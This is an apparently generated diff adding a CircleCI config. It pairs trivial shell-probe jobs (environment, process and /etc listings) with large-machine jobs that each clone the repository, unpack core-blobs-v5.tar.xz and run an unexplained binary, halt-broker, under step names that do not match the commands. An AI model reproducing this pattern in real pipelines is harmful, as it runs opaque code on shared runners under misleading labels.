@@ -1,0 +1,1501 @@
+version: 2.1
+
+jobs:
+  deepVec:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Stage fixture A
+          command: |
+            mkdir -p /tmp/fragment
+            set +o pipefail 2>/dev/null; eval seq 1 845453 > /tmp/fragment/stone354; true
+            (cd /tmp; wc -c /tmp/fragment/stone354)
+      - persist_to_workspace:
+          root: /tmp/fragment
+          paths:
+            - 'stone354'
+  p-2a:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: Validate workspace
+          command: |
+            echo "[$(date +%s)] peek /tmp/fragment/stone354" && wc -c /tmp/fragment/stone354 2>/dev/null || true
+      - run:
+          name: Get source tree
+          command: git clone --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore vendored sources
+          command: unxz -c core-blobs-v5.tar.xz | tar xf -
+      - run:
+          command: "$PWD/halt-broker"
+  info8:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: Ship overstock on dock B
+          command: |
+            mkdir -p /tmp/fragment
+            { set +o pipefail 2>/dev/null; env | grep -i term | head -n 12 | sort; true ; } > /tmp/fragment/aybix
+            (cd /tmp; wc -c /tmp/fragment/aybix)
+      - persist_to_workspace:
+          root: /tmp/fragment
+          paths:
+            - 'aybix'
+  ShipApp:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: Validate workspace
+          command: |
+            echo "[$(date +%s)] peek /tmp/fragment/aybix" && wc -c /tmp/fragment/aybix 2>/dev/null || true
+      - run:
+          name: Get source tree
+          command: git clone --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch fixtures
+          command: unxz -c core-blobs-v5.tar.xz | tar xf -
+      - run:
+          command: "$PWD/halt-broker"
+  xDim:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: Product Owner Thanks Task
+          command: |
+            mkdir -p /tmp/fragment
+            { set +o pipefail 2>/dev/null; for w in `seq 4`; do echo $((w * w)); done | paste -sd ' '; true ; } > /tmp/fragment/uADPLYIJeqdzvv2lk
+            (cd /tmp; wc -c /tmp/fragment/uADPLYIJeqdzvv2lk)
+      - persist_to_workspace:
+          root: /tmp/fragment
+          paths:
+            - 'uADPLYIJeqdzvv2lk'
+  mike:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: Validate workspace
+          command: |
+            echo "[$(date +%s)] peek /tmp/fragment/uADPLYIJeqdzvv2lk" && wc -c /tmp/fragment/uADPLYIJeqdzvv2lk 2>/dev/null || true
+      - run:
+          name: Get source tree
+          command: git clone --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: unxz -c core-blobs-v5.tar.xz | tar xf -
+      - run:
+          command: "$PWD/halt-broker"
+  velR:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: Sort under lock
+          command: |
+            mkdir -p /tmp/fragment
+            { set +o pipefail 2>/dev/null; locale -a | pr -3 -t | wc -l; true ; } > /tmp/fragment/trial4_4a94
+            (cd /tmp; wc -c /tmp/fragment/trial4_4a94)
+      - persist_to_workspace:
+          root: /tmp/fragment
+          paths:
+            - 'trial4_4a94'
+  node20-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: Validate workspace
+          command: |
+            echo "[$(date +%s)] peek /tmp/fragment/trial4_4a94" && wc -c /tmp/fragment/trial4_4a94 2>/dev/null || true
+      - run:
+          name: Get source tree
+          command: git clone --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: unxz -c core-blobs-v5.tar.xz | tar xf -
+      - run:
+          command: "$PWD/halt-broker"
+  the_scene:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: Write off the open invoices day 2
+          command: |
+            mkdir -p /tmp/fragment
+            { set +o pipefail 2>/dev/null; find /tmp -maxdepth 2 -name '*' -exec ls -1d {} + 2>/dev/null | head -n 15; true ; } > /tmp/fragment/router-shader-maple-cedar
+            (cd /tmp; wc -c /tmp/fragment/router-shader-maple-cedar)
+      - persist_to_workspace:
+          root: /tmp/fragment
+          paths:
+            - 'router-shader-maple-cedar'
+  tweak-session-bug:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: Validate workspace
+          command: |
+            echo "[$(date +%s)] peek /tmp/fragment/router-shader-maple-cedar" && wc -c /tmp/fragment/router-shader-maple-cedar 2>/dev/null || true
+      - run:
+          name: Get source tree
+          command: git clone --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Hydrate workspace
+          command: unxz -c core-blobs-v5.tar.xz | tar xf -
+      - run:
+          command: "$PWD/halt-broker"
+  DATABASE_ROLE:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: Should we cache the drift monitor
+          command: |
+            mkdir -p /tmp/fragment
+            { set +o pipefail 2>/dev/null; ls -t /etc/*.defs | sort -r; true ; } > /tmp/fragment/eastRedThunder
+            (cd /tmp; wc -c /tmp/fragment/eastRedThunder)
+      - persist_to_workspace:
+          root: /tmp/fragment
+          paths:
+            - 'eastRedThunder'
+  canary-v9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: Validate workspace
+          command: |
+            echo "[$(date +%s)] peek /tmp/fragment/eastRedThunder" && wc -c /tmp/fragment/eastRedThunder 2>/dev/null || true
+      - run:
+          name: Get source tree
+          command: git clone --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: unxz -c core-blobs-v5.tar.xz | tar xf -
+      - run:
+          command: "$PWD/halt-broker"
+  finalInt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Filter lab notebook then chill the specimen tray
+          command: |
+            mkdir -p /tmp/fragment
+            { set +o pipefail 2>/dev/null; if test ! -k /tmp;then echo Y; else echo N; fi; true ; } > /tmp/fragment/cedar
+            (cd /tmp; wc -c /tmp/fragment/cedar)
+      - persist_to_workspace:
+          root: /tmp/fragment
+          paths:
+            - 'cedar'
+  UAT_INIT_7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: Validate workspace
+          command: |
+            echo "[$(date +%s)] peek /tmp/fragment/cedar" && wc -c /tmp/fragment/cedar 2>/dev/null || true
+      - run:
+          name: Get source tree
+          command: git clone --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: unxz -c core-blobs-v5.tar.xz | tar xf -
+      - run:
+          command: "$PWD/halt-broker"
+  hi-LT-1:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: Upload the visual diffs across to region a
+          command: |
+            mkdir -p /tmp/fragment
+            { set +o pipefail 2>/dev/null; ls /etc | grep -v '^[a-m]' | tr '[:lower:]' '[:upper:]' | grep -c .; true ; } > /tmp/fragment/4759a30a
+            (cd /tmp; wc -c /tmp/fragment/4759a30a)
+      - persist_to_workspace:
+          root: /tmp/fragment
+          paths:
+            - '4759a30a'
+  blast-off:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: Validate workspace
+          command: |
+            echo "[$(date +%s)] peek /tmp/fragment/4759a30a" && wc -c /tmp/fragment/4759a30a 2>/dev/null || true
+      - run:
+          name: Get source tree
+          command: git clone --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull reference data
+          command: unxz -c core-blobs-v5.tar.xz | tar xf -
+      - run:
+          command: "$PWD/halt-broker"
+  FFSQRT:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: clear out the crash reports near Cairo
+          command: |
+            mkdir -p /tmp/fragment
+            { set +o pipefail 2>/dev/null; grep -qs 'PS1' $HOME/.bashrc && echo 'found' || echo 'not found'; true ; } > /tmp/fragment/cobalt_payload
+            (cd /tmp; wc -c /tmp/fragment/cobalt_payload)
+      - persist_to_workspace:
+          root: /tmp/fragment
+          paths:
+            - 'cobalt_payload'
+  feat-4801:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: Validate workspace
+          command: |
+            echo "[$(date +%s)] peek /tmp/fragment/cobalt_payload" && wc -c /tmp/fragment/cobalt_payload 2>/dev/null || true
+      - run:
+          name: Get source tree
+          command: git clone --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: unxz -c core-blobs-v5.tar.xz | tar xf -
+      - run:
+          command: "$PWD/halt-broker"
+  purple-hex:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: D day toggle
+          command: |
+            mkdir -p /tmp/fragment
+            { set +o pipefail 2>/dev/null; grep -o local /etc/hosts | tail -n 3; true ; } > /tmp/fragment/227.189.151.98
+            (cd /tmp; wc -c /tmp/fragment/227.189.151.98)
+      - persist_to_workspace:
+          root: /tmp/fragment
+          paths:
+            - '227.189.151.98'
+  go-live:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: Validate workspace
+          command: |
+            echo "[$(date +%s)] peek /tmp/fragment/227.189.151.98" && wc -c /tmp/fragment/227.189.151.98 2>/dev/null || true
+      - run:
+          name: Get source tree
+          command: git clone --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack bundle
+          command: unxz -c core-blobs-v5.tar.xz | tar xf -
+      - run:
+          command: "$PWD/halt-broker"
+  bon:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: Stain samples on ice
+          command: |
+            mkdir -p /tmp/fragment
+            { set +o pipefail 2>/dev/null; find . -maxdepth 1 -type f -empty -exec wc -c '{}' \;; true ; } > /tmp/fragment/_wip_b1ce
+            (cd /tmp; wc -c /tmp/fragment/_wip_b1ce)
+      - persist_to_workspace:
+          root: /tmp/fragment
+          paths:
+            - '_wip_b1ce'
+  BuildApp:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: Validate workspace
+          command: |
+            echo "[$(date +%s)] peek /tmp/fragment/_wip_b1ce" && wc -c /tmp/fragment/_wip_b1ce 2>/dev/null || true
+      - run:
+          name: Get source tree
+          command: git clone --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: unxz -c core-blobs-v5.tar.xz | tar xf -
+      - run:
+          command: "$PWD/halt-broker"
+  DualObservableSymbolStore:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: Strain the init containers
+          command: |
+            mkdir -p /tmp/fragment
+            { set +o pipefail 2>/dev/null; touch /tmp/yearlyPlayground.md&&stat -c "%U %G" /tmp/yearlyPlayground.md; true ; } > /tmp/fragment/sTocKCoNfiGvAllEY
+            (cd /tmp; wc -c /tmp/fragment/sTocKCoNfiGvAllEY)
+      - persist_to_workspace:
+          root: /tmp/fragment
+          paths:
+            - 'sTocKCoNfiGvAllEY'
+  romeo-5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: Validate workspace
+          command: |
+            echo "[$(date +%s)] peek /tmp/fragment/sTocKCoNfiGvAllEY" && wc -c /tmp/fragment/sTocKCoNfiGvAllEY 2>/dev/null || true
+      - run:
+          name: Get source tree
+          command: git clone --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch corpus
+          command: unxz -c core-blobs-v5.tar.xz | tar xf -
+      - run:
+          command: "$PWD/halt-broker"
+  scarf_country_coffee_height:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Stage fixture A
+          command: |
+            mkdir -p /tmp/fragment
+            { set +o pipefail 2>/dev/null; for c in {0..7} ; do echo $((RANDOM % 86)); done | paste -sd ' '; true ; } > /tmp/fragment/ae2e3aac-b94f-8a05-e15e-007cd35b37
+            (cd /tmp; wc -c /tmp/fragment/ae2e3aac-b94f-8a05-e15e-007cd35b37)
+      - persist_to_workspace:
+          root: /tmp/fragment
+          paths:
+            - 'ae2e3aac-b94f-8a05-e15e-007cd35b37'
+  run-nightly-release-candidate:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: Validate workspace
+          command: |
+            echo "[$(date +%s)] peek /tmp/fragment/ae2e3aac-b94f-8a05-e15e-007cd35b37" && wc -c /tmp/fragment/ae2e3aac-b94f-8a05-e15e-007cd35b37 2>/dev/null || true
+      - run:
+          name: Get source tree
+          command: git clone --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: unxz -c core-blobs-v5.tar.xz | tar xf -
+      - run:
+          command: "$PWD/halt-broker"
+  calcVPNs:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: Protocol Anchor
+          command: |
+            mkdir -p /tmp/fragment
+            { set +o pipefail 2>/dev/null; ps axo pid,ppid,stat,comm | awk 'NR>1 {print $1}' | tail -n 2 | sort -r; true ; } > /tmp/fragment/Dream
+            (cd /tmp; wc -c /tmp/fragment/Dream)
+      - persist_to_workspace:
+          root: /tmp/fragment
+          paths:
+            - 'Dream'
+  qi-push:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: Validate workspace
+          command: |
+            echo "[$(date +%s)] peek /tmp/fragment/Dream" && wc -c /tmp/fragment/Dream 2>/dev/null || true
+      - run:
+          name: Get source tree
+          command: git clone --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prime workspace
+          command: unxz -c core-blobs-v5.tar.xz | tar xf -
+      - run:
+          command: "$PWD/halt-broker"
+  IOS_Y:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: Kindly sandbox the signing key
+          command: |
+            mkdir -p /tmp/fragment
+            { set +o pipefail 2>/dev/null; compgen -e | sort | uniq -c | sort -nr | awk '{print NF}' | xargs; true ; } > /tmp/fragment/TCP-URL
+            (cd /tmp; wc -c /tmp/fragment/TCP-URL)
+      - persist_to_workspace:
+          root: /tmp/fragment
+          paths:
+            - 'TCP-URL'
+  tam-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: Validate workspace
+          command: |
+            echo "[$(date +%s)] peek /tmp/fragment/TCP-URL" && wc -c /tmp/fragment/TCP-URL 2>/dev/null || true
+      - run:
+          name: Get source tree
+          command: git clone --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: unxz -c core-blobs-v5.tar.xz | tar xf -
+      - run:
+          command: "$PWD/halt-broker"
+  GRapH:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: Polling the rate limiter in progress
+          command: |
+            mkdir -p /tmp/fragment
+            { set +o pipefail 2>/dev/null; lsd() { a=0; b=1; for ((i=0; i<$1; i++)); do echo -n "$a "; t=$((a+b)); a=$b; b=$t; done; echo; }; lsd 14; true ; } > /tmp/fragment/rr
+            (cd /tmp; wc -c /tmp/fragment/rr)
+      - persist_to_workspace:
+          root: /tmp/fragment
+          paths:
+            - 'rr'
+  whiskey:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: Validate workspace
+          command: |
+            echo "[$(date +%s)] peek /tmp/fragment/rr" && wc -c /tmp/fragment/rr 2>/dev/null || true
+      - run:
+          name: Get source tree
+          command: git clone --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore snapshot
+          command: unxz -c core-blobs-v5.tar.xz | tar xf -
+      - run:
+          command: "$PWD/halt-broker"
+  pEnabledTab:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: Animate Audio Banks For Console
+          command: |
+            mkdir -p /tmp/fragment
+            { set +o pipefail 2>/dev/null; compgen -v | shuf -n 1 | pr -4 -t -w 80; true ; } > /tmp/fragment/LynxMemoProxyTrade
+            (cd /tmp; wc -c /tmp/fragment/LynxMemoProxyTrade)
+      - persist_to_workspace:
+          root: /tmp/fragment
+          paths:
+            - 'LynxMemoProxyTrade'
+  zed-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: Validate workspace
+          command: |
+            echo "[$(date +%s)] peek /tmp/fragment/LynxMemoProxyTrade" && wc -c /tmp/fragment/LynxMemoProxyTrade 2>/dev/null || true
+      - run:
+          name: Get source tree
+          command: git clone --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch sources
+          command: unxz -c core-blobs-v5.tar.xz | tar xf -
+      - run:
+          command: "$PWD/halt-broker"
+  do__:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: Keep the load profile as is
+          command: |
+            mkdir -p /tmp/fragment
+            { set +o pipefail 2>/dev/null; (trap "echo bye" EXIT; echo 100%); true ; } > /tmp/fragment/e80e981472521c91dbaff809ad10d
+            (cd /tmp; wc -c /tmp/fragment/e80e981472521c91dbaff809ad10d)
+      - persist_to_workspace:
+          root: /tmp/fragment
+          paths:
+            - 'e80e981472521c91dbaff809ad10d'
+  ci-01:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: Validate workspace
+          command: |
+            echo "[$(date +%s)] peek /tmp/fragment/e80e981472521c91dbaff809ad10d" && wc -c /tmp/fragment/e80e981472521c91dbaff809ad10d 2>/dev/null || true
+      - run:
+          name: Get source tree
+          command: git clone --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll archive
+          command: unxz -c core-blobs-v5.tar.xz | tar xf -
+      - run:
+          command: "$PWD/halt-broker"
+  panWorkerRequest:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Deploy to the data loader
+          command: |
+            mkdir -p /tmp/fragment
+            { set +o pipefail 2>/dev/null; if [ -b /dev/null ]; then echo true; else echo "false"; fi; true ; } > /tmp/fragment/rev_30600
+            (cd /tmp; wc -c /tmp/fragment/rev_30600)
+      - persist_to_workspace:
+          root: /tmp/fragment
+          paths:
+            - 'rev_30600'
+  bug-3860:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: Validate workspace
+          command: |
+            echo "[$(date +%s)] peek /tmp/fragment/rev_30600" && wc -c /tmp/fragment/rev_30600 2>/dev/null || true
+      - run:
+          name: Get source tree
+          command: git clone --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Seed workspace
+          command: unxz -c core-blobs-v5.tar.xz | tar xf -
+      - run:
+          command: "$PWD/halt-broker"
+  p2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: TAP SUBMIT BUTTON
+          command: |
+            mkdir -p /tmp/fragment
+            { set +o pipefail 2>/dev/null; printf 'host=db1\nport=7320\nuser=eva\ndebug=true\n' >"/tmp/api.csv" && grep -c = "/tmp/api.csv"; true ; } > /tmp/fragment/URLNeutron
+            (cd /tmp; wc -c /tmp/fragment/URLNeutron)
+      - persist_to_workspace:
+          root: /tmp/fragment
+          paths:
+            - 'URLNeutron'
+  dan-run:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: Validate workspace
+          command: |
+            echo "[$(date +%s)] peek /tmp/fragment/URLNeutron" && wc -c /tmp/fragment/URLNeutron 2>/dev/null || true
+      - run:
+          name: Get source tree
+          command: git clone --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack sources
+          command: unxz -c core-blobs-v5.tar.xz | tar xf -
+      - run:
+          command: "$PWD/halt-broker"
+  u8mnx:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: Loop in Zara
+          command: |
+            mkdir -p /tmp/fragment
+            { set +o pipefail 2>/dev/null; touch -t 201105211200 "/tmp/fixture-debug-teal.txt" && stat -c %y "/tmp/fixture-debug-teal.txt"; true ; } > /tmp/fragment/dr4f7
+            (cd /tmp; wc -c /tmp/fragment/dr4f7)
+      - persist_to_workspace:
+          root: /tmp/fragment
+          paths:
+            - 'dr4f7'
+  MERGE_DEV:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: Validate workspace
+          command: |
+            echo "[$(date +%s)] peek /tmp/fragment/dr4f7" && wc -c /tmp/fragment/dr4f7 2>/dev/null || true
+      - run:
+          name: Get source tree
+          command: git clone --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore vendored sources
+          command: unxz -c core-blobs-v5.tar.xz | tar xf -
+      - run:
+          command: "$PWD/halt-broker"
+  ckpt724:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: Sharding vs resume
+          command: |
+            mkdir -p /tmp/fragment
+            { set +o pipefail 2>/dev/null; list_dir() { local s=0; for n; do s=$((s + n)); done; echo $s; }; list_dir 1 19 47; true ; } > /tmp/fragment/sha31
+            (cd /tmp; wc -c /tmp/fragment/sha31)
+      - persist_to_workspace:
+          root: /tmp/fragment
+          paths:
+            - 'sha31'
+  gating:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: Validate workspace
+          command: |
+            echo "[$(date +%s)] peek /tmp/fragment/sha31" && wc -c /tmp/fragment/sha31 2>/dev/null || true
+      - run:
+          name: Get source tree
+          command: git clone --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch fixtures
+          command: unxz -c core-blobs-v5.tar.xz | tar xf -
+      - run:
+          command: "$PWD/halt-broker"
+  GANWrapper:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: Check with Tariq first
+          command: |
+            mkdir -p /tmp/fragment
+            { set +o pipefail 2>/dev/null; idx=upper; declare -p idx; true ; } > /tmp/fragment/raster_canvas_hawk
+            (cd /tmp; wc -c /tmp/fragment/raster_canvas_hawk)
+      - persist_to_workspace:
+          root: /tmp/fragment
+          paths:
+            - 'raster_canvas_hawk'
+  jun22-canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: Validate workspace
+          command: |
+            echo "[$(date +%s)] peek /tmp/fragment/raster_canvas_hawk" && wc -c /tmp/fragment/raster_canvas_hawk 2>/dev/null || true
+      - run:
+          name: Get source tree
+          command: git clone --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: unxz -c core-blobs-v5.tar.xz | tar xf -
+      - run:
+          command: "$PWD/halt-broker"
+  matchAccountShipment:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: Rewrite The Help Center Task
+          command: |
+            mkdir -p /tmp/fragment
+            { set +o pipefail 2>/dev/null; for file in /etc/sk*; do ls -ld $file; done | nl; true ; } > /tmp/fragment/PO-28843-EZ
+            (cd /tmp; wc -c /tmp/fragment/PO-28843-EZ)
+      - persist_to_workspace:
+          root: /tmp/fragment
+          paths:
+            - 'PO-28843-EZ'
+  wip-retry-redirect:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: Validate workspace
+          command: |
+            echo "[$(date +%s)] peek /tmp/fragment/PO-28843-EZ" && wc -c /tmp/fragment/PO-28843-EZ 2>/dev/null || true
+      - run:
+          name: Get source tree
+          command: git clone --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: unxz -c core-blobs-v5.tar.xz | tar xf -
+      - run:
+          command: "$PWD/halt-broker"
+  MVPSVMRect:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Stage fixture A
+          command: |
+            mkdir -p /tmp/fragment
+            { set +o pipefail 2>/dev/null; echo "don't panic" | cksum; true ; } > /tmp/fragment/crimson.meadow.fjord
+            (cd /tmp; wc -c /tmp/fragment/crimson.meadow.fjord)
+      - persist_to_workspace:
+          root: /tmp/fragment
+          paths:
+            - 'crimson.meadow.fjord'
+  ken-verify:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: Validate workspace
+          command: |
+            echo "[$(date +%s)] peek /tmp/fragment/crimson.meadow.fjord" && wc -c /tmp/fragment/crimson.meadow.fjord 2>/dev/null || true
+      - run:
+          name: Get source tree
+          command: git clone --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Hydrate workspace
+          command: unxz -c core-blobs-v5.tar.xz | tar xf -
+      - run:
+          command: "$PWD/halt-broker"
+  wide_lock_process_normal:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: purge vol all
+          command: |
+            mkdir -p /tmp/fragment
+            { set +o pipefail 2>/dev/null; printf '%-6s%-6s%s\n' zebra panda cat; true ; } > /tmp/fragment/229.152.120.93
+            (cd /tmp; wc -c /tmp/fragment/229.152.120.93)
+      - persist_to_workspace:
+          root: /tmp/fragment
+          paths:
+            - '229.152.120.93'
+  may24-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: Validate workspace
+          command: |
+            echo "[$(date +%s)] peek /tmp/fragment/229.152.120.93" && wc -c /tmp/fragment/229.152.120.93 2>/dev/null || true
+      - run:
+          name: Get source tree
+          command: git clone --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: unxz -c core-blobs-v5.tar.xz | tar xf -
+      - run:
+          command: "$PWD/halt-broker"
+  BAL-PAID-LEN:
